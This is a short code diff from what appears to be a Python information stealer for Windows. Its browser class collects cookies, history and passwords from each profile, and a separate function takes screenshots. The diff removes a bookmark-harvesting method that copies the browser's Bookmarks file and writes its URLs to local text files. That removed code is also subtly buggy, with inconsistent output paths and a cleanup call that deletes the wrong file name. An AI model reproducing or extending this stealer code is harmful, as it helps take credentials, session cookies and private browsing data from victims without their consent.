@@ -343,8 +343,7 @@ class browsers():
             self.funcs = [
                 self.cookies, 
                 self.history, 
-                self.passwords,
-                self.bookmarks
+                self.passwords
                 ]
 
             for profile in self.profiles:
@@ -432,23 +431,6 @@ class browsers():
         cursor.close()
         conn.close()
         os.remove("Historyvault.db")
-    
-    def bookmarks(self, name: str, path: str, profile: str) -> None:
-        path += '\\' + profile + '\\Bookmarks'
-        if not os.path.isfile(path):
-            return
-        copy2(path, 'browser-bookmarks.json')
-        with open('browser-bookmarks.json', 'r', encoding="utf-8") as f:
-            for item in json.loads(f.read())['roots']['bookmark_bar']['children']:
-                if 'children' in item:
-                    for child in item['children']:
-                        if 'url' in child:
-                            with open('.\\browser-bookmarks.txt', 'a', encoding="utf-8") as f:
-                                f.write("URL: {}\n".format(child['url']))
-                elif 'url' in item:
-                    with open('\\browser-bookmarks.txt', 'a', encoding="utf-8") as f:
-                        f.write("URL: {}\n".format(item['url']))
-        os.remove('bookmarks.json')
 
 def ss():
     ImageGrab.grab(
